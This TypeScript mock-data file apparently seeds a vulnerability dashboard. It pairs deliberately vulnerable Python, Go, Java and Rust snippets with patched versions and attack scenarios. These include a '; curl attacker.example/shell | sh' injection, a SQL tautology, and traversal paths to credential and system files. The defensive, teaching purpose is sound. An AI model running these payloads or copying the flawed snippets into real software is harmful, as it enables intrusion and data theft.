import type { Draft } from '@/services/mock/catalog'

const PYTHON_MODULES = [
  'audit',
  'settlement',
  'invoice',
  'subscription',
  'refund',
  'payout',
  'dispute',
  'merchant',
  'chargeback',
  'quote',
  'credit',
  'balance',
  'receipt',
  'tax',
  'webhook',
  'plan',
  'coupon',
  'ledger',
  'replay',
  'notify',
]

function pySql(module: string, projectKey: string): Draft {
  return {
    projectKey,
    title: `SQL concatenation in ${module} search`,
    summary: `The ${module} search built a LIKE clause by concatenating the operator's query.`,
    severity: 'high',
    cwe: 'CWE-89',
    cweName: 'SQL Injection',
    file: `app/archive/${module}_search.py`,
    scanner: 'Semgrep',
    language: 'Python',
    confidence: 93,
    status: 'fixed',
    vulnerable: `
def search_${module}(term: str, connection) -> list[tuple]:
    statement = f"SELECT id, amount FROM ${module} WHERE note LIKE '%{term}%'"
    @@SINK@@return list(connection.execute(statement))
`,
    patched: `
def search_${module}(term: str, connection) -> list[tuple]:
    statement = "SELECT id, amount FROM ${module} WHERE note LIKE ?"
    return list(connection.execute(statement, (f"%{term}%",)))
`,
    analysis: {
      rootCause: `search_${module} interpolated the request term into the SQL text.`,
      impact: 'A crafted term can change the predicate and return rows from another tenant.',
      attackScenario: `GET /internal/${module}?q=' OR '1'='1' -- returns every row the connection can see.`,
      recommendedFix: 'Bind the term as a parameter and keep wildcards in the bound value, not in the statement.',
      confidence: 93,
    },
    explanation:
      'The statement is now a constant. The term, including any quotes or comment markers, is passed as a bound parameter and cannot change the query structure.',
  }
}

function pyCommand(module: string, projectKey: string): Draft {
  return {
    projectKey,
    title: `Shell invocation in ${module} worker`,
    summary: `The ${module} worker built a shell command from a queue payload.`,
    severity: 'critical',
    cwe: 'CWE-78',
    cweName: 'OS Command Injection',
    file: `app/archive/${module}_worker.py`,
    scanner: 'Bandit',
    language: 'Python',
    confidence: 95,
    status: 'fixed',
    vulnerable: `
import os

def run_${module}(name: str) -> int:
    @@SINK@@return os.system(f"python /opt/workers/${module}/{name}.py")
`,
    patched: `
import re
import subprocess
from pathlib import Path

NAME = re.compile(r"[a-z0-9_]{1,40}")
ROOT = Path("/opt/workers/${module}")

def run_${module}(name: str) -> int:
    if NAME.fullmatch(name) is None:
        raise ValueError("worker name is not a single filename")
    completed = subprocess.run(["python", str(ROOT / f"{name}.py")], check=False)
    return completed.returncode
`,
    analysis: {
      rootCause: `run_${module} passed a queue-controlled filename through a shell string.`,
      impact: 'Anyone who can publish to the queue can execute arbitrary commands on the worker host.',
      attackScenario: `A payload of \`; curl attacker.example/shell | sh\` runs during the next ${module} tick.`,
      recommendedFix: 'Reject unexpected names and exec a fixed interpreter with an argument list.',
      confidence: 95,
    },
    explanation:
      'os.system was removed. The name must match a filename allowlist, and the interpreter is invoked without a shell.',
  }
}

function pySecret(module: string, projectKey: string): Draft {
  return {
    projectKey,
    title: `Hardcoded credential in ${module} client`,
    summary: `A static secret for the ${module} integration was committed next to the client.`,
    severity: 'high',
    cwe: 'CWE-798',
    cweName: 'Use of Hard-coded Credentials',
    file: `app/archive/${module}_client.py`,
    scanner: 'Gitleaks',
    language: 'Python',
    confidence: 99,
    status: 'fixed',
    vulnerable: `
import httpx

@@SINK@@TOKEN = "northline_${module}_demo_token_91af"

def post_event(payload: dict) -> int:
    response = httpx.post(
        "https://${module}.internal/events",
        json=payload,
        headers={"Authorization": f"Bearer {TOKEN}"},
        timeout=5,
    )
    return response.status_code
`,
    patched: `
import os
import httpx

def token() -> str:
    value = os.environ.get("${module.toUpperCase()}_TOKEN")
    if not value:
        raise RuntimeError("${module.toUpperCase()}_TOKEN is not set")
    return value

def post_event(payload: dict) -> int:
    response = httpx.post(
        "https://${module}.internal/events",
        json=payload,
        headers={"Authorization": f"Bearer {token()}"},
        timeout=5,
    )
    return response.status_code
`,
    analysis: {
      rootCause: `The ${module} bearer token lived in source control.`,
      impact: 'Anyone with repository access can call the integration as this service.',
      attackScenario: 'A copied token is reused from a laptop image long after the employee offboards.',
      recommendedFix: 'Read the token from the environment at call time and fail closed when it is missing.',
      confidence: 99,
    },
    explanation:
      'The literal was removed. The client now resolves the secret from the process environment and refuses to send an empty credential.',
  }
}

function pyPath(module: string, projectKey: string): Draft {
  return {
    projectKey,
    title: `Path traversal in ${module} export`,
    summary: `The ${module} export joined a caller-supplied name onto the export directory.`,
    severity: 'high',
    cwe: 'CWE-22',
    cweName: 'Path Traversal',
    file: `app/archive/${module}_export.py`,
    scanner: 'Semgrep',
    language: 'Python',
    confidence: 96,
    status: 'fixed',
    vulnerable: `
from pathlib import Path

ROOT = Path("/var/exports/${module}")

def read_export(name: str) -> bytes:
    @@SINK@@return (ROOT / name).read_bytes()
`,
    patched: `
from pathlib import Path

ROOT = Path("/var/exports/${module}").resolve()

def read_export(name: str) -> bytes:
    candidate = (ROOT / name).resolve()
    if not candidate.is_relative_to(ROOT):
        raise ValueError("export escapes the ${module} directory")
    return candidate.read_bytes()
`,
    analysis: {
      rootCause: `read_export trusted the filename and resolved it under the export root without checking the result.`,
      impact: 'A name such as ../../proc/self/environ reads files the worker can see.',
      attackScenario: `GET /exports/${module}?name=../../app/archive/${module}_client.py returns source from the image.`,
      recommendedFix: 'Resolve the candidate and reject any path that is not inside the export root.',
      confidence: 96,
    },
    explanation:
      'The resolved path must stay inside the export root. Parent-directory segments no longer escape it.',
  }
}

function goJwt(name: string, projectKey: string): Draft {
  return {
    projectKey,
    title: `Unchecked signing method in ${name}`,
    summary: `${name} accepted a JWT without pinning the signing algorithm.`,
    severity: 'high',
    cwe: 'CWE-347',
    cweName: 'Improper Verification of Cryptographic Signature',
    file: `internal/archive/${name}.go`,
    scanner: 'Gosec',
    language: 'Go',
    confidence: 94,
    status: 'fixed',
    vulnerable: `
package archive

import "github.com/golang-jwt/jwt/v5"

func Parse${pascal(name)}(token string, key []byte) (jwt.MapClaims, error) {
    parsed, err := jwt.Parse(token, func(t *jwt.Token) (any, error) {
        @@SINK@@return key, nil
    })
    if err != nil || !parsed.Valid {
        return nil, err
    }
    return parsed.Claims.(jwt.MapClaims), nil
}
`,
    patched: `
package archive

import (
    "errors"
    "github.com/golang-jwt/jwt/v5"
)

func Parse${pascal(name)}(token string, key []byte) (jwt.MapClaims, error) {
    parsed, err := jwt.Parse(token, func(t *jwt.Token) (any, error) {
        if t.Method.Alg() != jwt.SigningMethodHS256.Alg() {
            return nil, errors.New("unexpected signing method")
        }
        return key, nil
    })
    if err != nil || !parsed.Valid {
        return nil, err
    }
    return parsed.Claims.(jwt.MapClaims), nil
}
`,
    analysis: {
      rootCause: `${name} returned the HMAC key for every token header.`,
      impact: 'An attacker can switch the alg header and forge a session accepted by this parser.',
      attackScenario: 'A token with alg set to none, or signed with a public key as an HMAC secret, passes verification.',
      recommendedFix: 'Reject every signing method other than HS256 before the key is used.',
      confidence: 94,
    },
    explanation:
      'The key function now refuses any algorithm other than HS256, so the header can no longer select a weaker method.',
  }
}

function goLog(name: string, projectKey: string): Draft {
  return {
    projectKey,
    title: `Log injection in ${name}`,
    summary: `${name} wrote a request header into the log without stripping line breaks.`,
    severity: 'low',
    cwe: 'CWE-117',
    cweName: 'Improper Output Neutralization for Logs',
    file: `internal/archive/${name}.go`,
    scanner: 'Gosec',
    language: 'Go',
    confidence: 81,
    status: 'fixed',
    vulnerable: `
package archive

import "log"

func Record${pascal(name)}(userID, agent string) {
    @@SINK@@log.Printf("access user=%s agent=%s", userID, agent)
}
`,
    patched: `
package archive

import (
    "log"
    "strings"
)

func Record${pascal(name)}(userID, agent string) {
    clean := strings.ReplaceAll(strings.ReplaceAll(agent, "\\n", " "), "\\r", " ")
    log.Printf("access user=%s agent=%s", userID, clean)
}
`,
    analysis: {
      rootCause: 'The user agent was copied into a log line verbatim.',
      impact: 'A forged header can inject extra log lines and poison downstream detections.',
      attackScenario: 'User-Agent set to "ok\\nlevel=error user=admin action=grant" creates a fake audit event.',
      recommendedFix: 'Replace CR and LF before the value is written.',
      confidence: 81,
    },
    explanation: 'Carriage returns and newlines in the header are folded to spaces before the log write.',
  }
}

function javaPath(name: string, projectKey: string): Draft {
  return {
    projectKey,
    title: `Path traversal in ${name} download`,
    summary: `${name} resolved a request parameter directly under the export directory.`,
    severity: 'high',
    cwe: 'CWE-22',
    cweName: 'Path Traversal',
    file: `src/main/java/io/northline/archive/${pascal(name)}Download.java`,
    scanner: 'Semgrep',
    language: 'Java',
    confidence: 96,
    status: 'fixed',
    vulnerable: `
package io.northline.archive;

import java.nio.file.*;

public final class ${pascal(name)}Download {
    private static final Path ROOT = Paths.get("/var/ledger/archive/${name}");

    public byte[] read(String name) throws Exception {
        @@SINK@@return Files.readAllBytes(ROOT.resolve(name));
    }
}
`,
    patched: `
package io.northline.archive;

import java.nio.file.*;

public final class ${pascal(name)}Download {
    private static final Path ROOT = Paths.get("/var/ledger/archive/${name}").toAbsolutePath().normalize();

    public byte[] read(String name) throws Exception {
        Path candidate = ROOT.resolve(name).toAbsolutePath().normalize();
        if (!candidate.startsWith(ROOT)) {
            throw new IllegalArgumentException("export escapes the archive root");
        }
        return Files.readAllBytes(candidate);
    }
}
`,
    analysis: {
      rootCause: `${name} trusted the filename passed to Path.resolve.`,
      impact: 'A relative path can read files outside the archive.',
      attackScenario: `GET /archive/${name}?file=../../../../etc/hostname returns a host file when the process can read it.`,
      recommendedFix: 'Normalize the candidate and require that it stay under the archive root.',
      confidence: 96,
    },
    explanation:
      'The download now normalizes both roots and rejects a candidate that does not start with the archive directory.',
  }
}

function javaXxe(name: string, projectKey: string): Draft {
  return {
    projectKey,
    title: `XML external entity in ${name} parser`,
    summary: `${name} parsed request XML with a default DocumentBuilder.`,
    severity: 'medium',
    cwe: 'CWE-611',
    cweName: 'Improper Restriction of XML External Entity Reference',
    file: `src/main/java/io/northline/archive/${pascal(name)}Parser.java`,
    scanner: 'CodeQL',
    language: 'Java',
    confidence: 90,
    status: 'fixed',
    vulnerable: `
package io.northline.archive;

import javax.xml.parsers.*;
import org.w3c.dom.Document;
import java.io.InputStream;

public final class ${pascal(name)}Parser {
    public Document parse(InputStream body) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        @@SINK@@return factory.newDocumentBuilder().parse(body);
    }
}
`,
    patched: `
package io.northline.archive;

import javax.xml.XMLConstants;
import javax.xml.parsers.*;
import org.w3c.dom.Document;
import java.io.InputStream;

public final class ${pascal(name)}Parser {
    public Document parse(InputStream body) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setExpandEntityReferences(false);
        return factory.newDocumentBuilder().parse(body);
    }
}
`,
    analysis: {
      rootCause: `${name} left DOCTYPE processing enabled on the XML parser.`,
      impact: 'A document can declare an external entity and read local files or call internal hosts.',
      attackScenario: 'A payload with a SYSTEM entity pointed at file:///etc/passwd embeds the file in parsed text.',
      recommendedFix: 'Disable doctypes and entity expansion on the factory before parsing.',
      confidence: 90,
    },
    explanation:
      'The parser now rejects doctypes and turns off entity expansion, so an external entity cannot be resolved.',
  }
}

function rustTls(name: string, projectKey: string): Draft {
  return {
    projectKey,
    title: `Disabled certificate checks in ${name}`,
    summary: `${name} built an HTTP client that accepted any certificate.`,
    severity: 'high',
    cwe: 'CWE-295',
    cweName: 'Improper Certificate Validation',
    file: `src/archive/${name}.rs`,
    scanner: 'Semgrep',
    language: 'Rust',
    confidence: 92,
    status: 'fixed',
    vulnerable: `
use reqwest::Client;

pub fn client_${name}() -> reqwest::Result<Client> {
    @@SINK@@Client::builder().danger_accept_invalid_certs(true).build()
}
`,
    patched: `
use reqwest::Client;

pub fn client_${name}() -> reqwest::Result<Client> {
    Client::builder().danger_accept_invalid_certs(false).build()
}
`,
    analysis: {
      rootCause: `${name} turned off certificate validation to get past a broken dev proxy and shipped that way.`,
      impact: 'Any network position between the proxy and the origin can impersonate the upstream.',
      attackScenario: 'A forged certificate for the origin is accepted and settlement traffic is intercepted.',
      recommendedFix: 'Use the default verifier. Pin or install the internal CA instead of disabling checks.',
      confidence: 92,
    },
    explanation:
      'Invalid certificates are rejected again. A private CA belongs in the trust store, not in a disabled verifier.',
  }
}

function pascal(value: string) {
  return value
    .split(/[_-]/)
    .map((part) => part.charAt(0).toUpperCase() + part.slice(1))
    .join('')
}

export function buildHistorical(): Draft[] {
  const python = PYTHON_MODULES
  const drafts: Draft[] = []
  const take = (projectKey: string, kinds: Array<(module: string, projectKey: string) => Draft>, count: number, offset: number) => {
    for (let index = 0; index < count; index += 1) {
      const kind = kinds[index % kinds.length]
      const module = python[(offset + index) % python.length]
      drafts.push(kind(module, projectKey))
    }
  }
  take('cyberguard', [pySql, pyCommand, pySecret, pyPath], 18, 0)
  take('payments', [pySql, pyPath, pySecret], 10, 4)
  take('patchpilot', [pySql, pyCommand], 8, 8)
  ;['session', 'refresh', 'introspect', 'revoke', 'device', 'consent', 'mfa', 'recovery'].forEach((name, index) => {
    drafts.push((index % 2 === 0 ? goJwt : goLog)(name, 'secureauth'))
  })
  ;['snapshot', 'export', 'statement', 'manifest'].forEach((name) => {
    drafts.push(javaPath(name, 'ledger'))
  })
  ;['policy', 'counterparty', 'holiday', 'schema'].forEach((name) => {
    drafts.push(javaXxe(name, 'ledger'))
  })
  ;['origin', 'billing', 'health', 'metrics', 'admin'].forEach((name) => {
    drafts.push(rustTls(name, 'edge'))
  })
  return drafts
}
